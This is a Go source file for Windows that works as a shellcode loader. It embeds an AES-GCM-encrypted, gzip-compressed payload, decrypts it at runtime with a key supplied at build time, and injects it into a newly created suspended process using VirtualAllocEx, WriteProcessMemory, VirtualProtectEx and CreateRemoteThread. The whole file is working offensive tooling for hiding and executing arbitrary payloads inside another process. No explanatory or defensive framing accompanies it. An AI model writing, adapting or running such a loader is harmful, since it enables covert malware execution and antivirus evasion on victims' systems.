//go:build windows

package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"io"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

//go:embed encrypted_shellcode.bin
var enc []byte

var franky string
var injectProc string

func decrypt() []byte {
	var readbytes bytes.Buffer
	var gz io.Reader

	buf := bytes.NewBuffer(enc)
	gz, _ = gzip.NewReader(buf)
	readbytes.ReadFrom(gz)
	encrypted := readbytes.Bytes()

	block, _ := aes.NewCipher([]byte(franky))
	aesGCM, _ := cipher.NewGCM(block)
	nonceSize := aesGCM.NonceSize()
	nonce, shellcode := encrypted[:nonceSize], encrypted[nonceSize:]
	plaintext, _ := aesGCM.Open(nil, nonce, shellcode, nil)
	return plaintext
}

func main() {
	var startupInfo syscall.StartupInfo
	var processInfo syscall.ProcessInformation

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	createRemoteThread := kernel32.NewProc("CreateRemoteThread")
	closeHandle := kernel32.NewProc("CloseHandle")

	process, _ := syscall.UTF16PtrFromString(injectProc)

	syscall.CreateProcess(nil, process, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &startupInfo, &processInfo)

	oldProtect := windows.PAGE_READWRITE

	shellcode := decrypt()

	lpBaseAddress, _, _ := virtualAllocEx.Call(uintptr(processInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	writeProcessMemory.Call(uintptr(processInfo.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	virtualProtectEx.Call(uintptr(processInfo.Process), lpBaseAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	createRemoteThread.Call(uintptr(processInfo.Process), 0, 0, lpBaseAddress, 0, 0, 0)
	closeHandle.Call(uintptr(processInfo.Process))
}
